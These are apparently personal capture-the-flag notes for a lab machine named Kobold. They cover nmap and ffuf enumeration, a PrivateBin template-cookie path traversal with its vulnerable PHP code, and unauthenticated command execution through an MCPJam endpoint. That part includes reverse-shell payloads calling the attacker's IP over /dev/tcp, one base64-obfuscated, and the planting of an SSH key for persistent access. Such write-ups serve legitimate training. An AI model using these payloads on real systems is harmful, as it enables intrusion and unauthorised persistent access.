@@ -1,0 +1,263 @@
+#+title: Kobold
+#+author:gabriel
+
+* nmap
+first scan -->
+#+begin_src shell
+sudo nmap -sCV --reason -oA nmap/kobold 10.129.74.46
+#+end_src
+
+open ports and running services -->
+#+begin_src shell
+   1 # Nmap 7.94SVN scan initiated Sun Aug  2 15:07:32 2026 as: nmap -sCV --reason -oA nmap/kobold 10.129.74.46
+   2 Nmap scan report for 10.129.74.46
+   3 Host is up, received echo-reply ttl 63 (0.14s latency).
+   4 Not shown: 997 closed tcp ports (reset)
+   5 PORT    STATE SERVICE  REASON         VERSION
+   6 22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+   7 | ssh-hostkey:
+   8 |   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
+   9 |_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
+  10 80/tcp  open  http     syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
+  11 |_http-title: Did not follow redirect to https://kobold.htb/
+  12 443/tcp open  ssl/http syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
+  13 | tls-alpn:
+  14 |   http/1.1
+  15 |   http/1.0
+  16 |_  http/0.9
+  17 |_ssl-date: TLS randomness does not represent time
+  18 |_http-title: Did not follow redirect to https://kobold.htb/
+  19 |_http-server-header: nginx/1.24.0 (Ubuntu)
+  20 | ssl-cert: Subject: commonName=kobold.htb
+  21 | Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
+  22 | Not valid before: 2026-03-15T15:08:55
+  23 |_Not valid after:  2125-02-19T15:08:55
+  24 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  25
+  26 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  27 # Nmap done at Sun Aug  2 15:08:05 2026 -- 1 IP address (1 host up) scanned in 33.44 seconds
+#+end_src
+
+* dns configuration
+editing the /etc/hosts file to map hostnaame to IP address -->
+#+begin_src
+sudo vim /etc/hosts
+
+10.129.74.46 kobold.htb
+#+end_src
+
+access the web application ->
+#+begin_src shell
+https://kobold.htb/#
+
+curl -Ik https://kobold.htb/
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Sun, 02 Aug 2026 18:22:39 GMT
+Content-Type: text/html
+Content-Length: 3812
+Last-Modified: Sun, 15 Mar 2026 15:50:24 GMT
+Connection: keep-alive
+ETag: "69b6d540-ee4"
+Accept-Ranges: bytes
+#+end_src
+
+* error message inspection
+after testing an incorrect directory on purpose, we receive the error message "FIle not found"
+
+- we can perform a search on the https://0xdf.gitlab.io/cheatsheets/
+
+it was possible to identify that this error message is associated with the PHP-FPM.
+
+PHP FastCGI Process Manager, or PHP-FPM, is the PHP implementation for taking requests from a webserver like Apache or nginx and managing processes to handle the PHP execution of the requested URL / page. If the server passes the page to PHP-FPM, and it can’t find the page, it simply returns the text “File not found.\n”:
+* enumeration subdomains with HOST header
+ffuf enumeration -->
+#+begin_src shell
+ffuf -H "Host: FUZZ.kobold.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u https://kobold.htb
+#+end_src
+
+filter status code response ->
+#+begin_src shell
+ffuf -H "Host: FUZZ.kobold.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u https://kobold.htb/ -fc 302
+#+end_src
+
+Two interesting subdomains found ->
+#+begin_src text
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://kobold.htb/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.kobold.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 302
+________________________________________________
+
+mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 239ms]
+bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 529ms]
+#+end_src
+
+add the two subdomains found to the /etc/hosts file ->
+#+begin_src shell
+sudo vim /etc/hosts
+
+10.129.74.46 kobold.htb bin.kobold.htb mcp.kobold.htb
+#+end_src
+
+* LOOP pastebin
+PrivateBin is a minimalist, open source online pastebin where the server has zero knowledge of stored data.
+
+Data is encrypted and decrypted in the browser using 256bit AES in Galois Counter mode.
+
+This is a fork of ZeroBin, originally developed by Sébastien Sauvage. PrivateBin was refactored to allow easier and cleaner extensions and has many additional features.
+
+** CVE-2025-64714 — PrivateBin Local File Inclusion via Template Cookie Path Traversal
+#+begin_src text
+Severity: Medium (CVSS v3.1: 5.8)
+Vector: AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
+Affected versions: PrivateBin >= 1.7.7
+Patched version: 2.0.3
+CWE: CWE-23 (Relative Path Traversal), CWE-73 (External Control of File Name or Path), CWE-98 (PHP File Inclusion)
+Official advisory: https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-g2j9-g8r5-rg82
+Reporter: Benoit Esnard
+#+end_src
+
+- PrivateBin version 1.7.7 introduced a template-switching feature allowing users to persist their preferred visual theme via a template cookie. Due to insufficient validation of the cookie value, an unauthenticated attacker can supply a path traversal sequence (e.g. ../) to cause the server to include an arbitrary PHP file from outside the intended tpl/ directory — a classic Local File Inclusion (LFI) vulnerability.
+
+- When chained with a separate write primitive (a misconfigured upload endpoint, another vulnerability, or local access), this LFI can escalate to Remote Code Execution (RCE).
+
+#+begin_src php
+// VULNERABLE (1.7.7 – 2.0.2)
+public static function isTemplateAvailable(string $template): bool
+{
+    $available = in_array($template, self::getAvailableTemplates());
+
+    if (!$available && !View::isBootstrapTemplate($template)) {
+        $path      = View::getTemplateFilePath($template);
+        $available = file_exists($path);  // ← trusts user-supplied $template
+    }
+
+    return $available;
+#+end_src
+
+- Path Construction — No Sanitisation
+
+View::getTemplateFilePath() simply concatenates the user-supplied value into a filesystem path:
+#+begin_src php
+// Simplified
+return PATH . 'tpl' . DIRECTORY_SEPARATOR . $template . '.php';
+#+end_src
+
+With template=../cfg/conf the resolved path becomes:
+#+begin_src text
+/var/www/privatebin/tpl/../cfg/conf.php
+       ──────────────────────────────────
+              = /var/www/privatebin/cfg/conf.php
+#+end_src
+
+There is no call to realpath(), no stripping of .. sequences, and no check that the resolved path stays within tpl/.
+-----
+Once isTemplateAvailable() returns true, View::draw() unconditionally includes the path:
+#+begin_src php
+public function draw($template)
+{
+    $path = self::getTemplateFilePath($template);
+    if (!file_exists($path)) {
+        throw new Exception('Template ' . $template . ' not found!', 80);
+    }
+    extract($this->_variables);
+    include $path;          // ← attacker-controlled path included here
+}
+#+end_src
+
+returns 200 ->
+#+begin_src php
+Cookie: template=php://filter/convert.base64-encode/resource=../cfg/conf;
+#+end_src
+
+but php filter doesn't works with file_exists ->
+#+begin_src shell
+php -a
+
+php > print( file_exists('/etc/passwd') );
+1
+
+----------
+
+php > print( file_exists('php://filter/convert.base64-encode/resource=/etc/passw
+d') );
+0
+#+end_src
+
+* TODO mcp.kobold.htb
+This subdomain is serving an instance of MCPJam.
+
+RCE Documentation example -->
+#+begin_src shell
+curl http://10.97.58.83:6274/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"cmd.exe\",\"args\":[\"/c\", \"calc\"],\"env\":{}},\"serverId\":\"mytest\"}"
+#+end_src
+
+testing the RCE with sleep command -->
+#+begin_src shell
+time curl -k https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"/bin/sh\",\"args\":[\"-c\", \"sleep 3\"],\"env\":{}},\"serverId\":\"mytest\"}"
+
+0,01s user 0,01s system 0% cpu 3,595 total
+#+end_src
+
+testing with 4 seconds -->
+#+begin_src shell
+time curl -k https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"/bin/sh\",\"args\":[\"-c\", \"sleep 4\"],\"env\":{}},\"serverId\":\"mytest\"}"
+
+0,01s user 0,01s system 0% cpu 4,544 total
+#+end_src
+
+target machine adaptation -->
+#+begin_src shell
+curl -k https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"/bin/bash\",\"args\":[\"-c\", \"bash -i >& /dev/tcp/10.10.14.74/8002 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}"
+
+ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
+#+end_src
+
+different way, same result -->
+#+begin_src shell
+bash -i >& /dev/tcp/10.10.14.74/8002 0>&1 | base64 -w0
+
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43NC84MDAyIDA+JjE=
+
+curl -k https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"/bin/bash\",\"args\":[\"-c\", \"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43NC84MDAyIDA+JjE= | base64 -d | bash\"],\"env\":{}},\"serverId\":\"mytest\"}"
+
+ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
+#+end_src
+generating SSH key for a better shell -->
+#+begin_src shell
+ssh-keygen -t ed25519 -f htb-shell
+
+|    ++* .        |
+|     =+=         |
+|     =o.o        |
+|    o oo +       |
+|     +o S . o    |
+|   . Bo* * + .   |
+| ..o+ =.O +   .  |
+|.o+ o... +     E |
+|o..+o......      |
+#+end_src
+
+with the RCE first shell established, add the ssh public key to the authorized_keys file inside .ssh directory ->
+#+begin_src shell
+ben@kobold:~/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOmwwh9O7lkEfm7SyWv8d5h5B4dJDdkgInEXUOVfc2yJ ilak@ilak' > authorized_keys
+<h5B4dJDdkgInEXUOVfc2yJ ilak@ilak' > authorized_keys
+#+end_src
